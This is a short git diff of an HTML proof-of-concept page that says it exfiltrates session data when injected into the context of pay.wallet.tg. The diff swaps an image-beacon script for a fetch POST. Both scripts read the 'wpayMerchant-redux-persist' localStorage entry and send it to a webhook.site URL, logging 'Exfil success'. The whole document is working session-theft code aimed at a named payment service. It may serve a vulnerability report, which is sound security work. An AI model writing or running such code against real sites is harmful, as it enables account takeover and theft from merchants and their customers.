@@ -9,18 +9,15 @@
   <p>If this page is injected into the context of <code>pay.wallet.tg</code>, it will exfiltrate the session data via a GET request.</p>
 
   <script>
-    (function () {
-      const webhookURL = "https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25"; // ✅ your actual webhook
-      const stolenData = localStorage.getItem("wpayMerchant-redux-persist");
-      if (stolenData) {
-        const encoded = encodeURIComponent(stolenData);
-        const img = new Image();
-        img.src = webhookURL + "?data=" + encoded;
-        document.body.appendChild(img);
-      } else {
-        console.warn("No session data found in localStorage.");
-      }
-    })();
+fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    localStorage: localStorage.getItem('wpayMerchant-redux-persist')
+  })
+})
+.then(res => console.log("Exfil success:", res))
+.catch(err => console.error("Exfil failed:", err));
   </script>
 </body>
 </html>
